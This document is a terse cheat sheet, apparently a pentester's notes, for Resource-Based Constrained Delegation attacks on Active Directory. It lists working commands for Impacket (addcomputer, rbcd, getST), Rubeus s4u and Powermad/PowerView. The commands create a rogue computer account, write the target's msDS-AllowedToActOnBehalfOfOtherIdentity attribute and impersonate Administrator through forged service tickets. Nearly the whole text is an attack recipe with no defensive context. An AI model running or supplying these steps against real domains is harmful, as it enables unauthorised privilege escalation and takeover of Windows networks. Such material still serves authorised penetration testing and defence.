# Resource-Based Constrained Delegation (RBCD)

### Object: msDS-AllowedToActOnBehalfOfOtherIdentity

## Tools: rbcd.py , rubeus.exe , getST , addcomputer.py

#### 1) addcomputer.py

 - addcomputer.py -computer-name 'COMPUTER_NAME' -computer-pass 'COMPUTER_PASSWORD' -dc-host DC -domain-netbios DOMAIN_NETBIOS 'DOMAIN/USER:PASSWORD' (Add computer account)

#### 2) Rubeus

 - rubeus.exe hash /password:COMPUTER_PASS /user:COMPUTER /domain:DOMAIN

 - rubeus.exe s4u /user:FAKE_COMPUTER$ /aes256:AES_256_HASH /impersonateuser:administrator /msdsspn:cifs/VICTIM.DOMAIN.LOCAL /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:DOMAIN.LOCAL/ptt (System/Admin access)

#### 3) rbcd.py

 - impacket-rbcd -delegate-to 'TARGET$' -dc-ip 'DC' -action 'read' 'domain'/'USER':'PASSWORD' (Try to read the attribute)

 - impacket-rbcd -delegate-from 'COMPUTER$' -delegate-to 'TARGET$' -dc-ip 'DC' -action 'write' DOMAIN/USER:PASSWORD

 - getST.py -spn host/DC_FQDN 'DOMAIN/COMPUTER_ACCOUNT:COMPUTER_PASS' -impersonate Administrator -dc-ip DC_IP (Get TGT ticket)

#### 4) Powermad

 - import-module powermad 

 - New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose (Create a new computer object)

 - Get-DomainComputer fake01 (Check our newly created computer and get its SID)

### Create a new raw security descriptor for the FAKE01 computer principal

 - $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2552734371-813931464-1050690807-1154)"

 - $SDBytes = New-Object byte[] ($SD.BinaryLength)

 - $SD.GetBinaryForm($SDBytes, 0)

### Apply the security descriptor bytes to the target machine

 - Get-DomainComputer TARGET_COMPUTER | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

 - (New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0).DiscretionaryAcl (Test if the security descriptor assigned to target computer in msds-allowedtoactonbehalfofotheridentity attribute refers to the fake01$ machine. If yes, we shall see the SID of our created computer)

### Then use Rubeus or getST to impersonate an account on our target computer of our choice
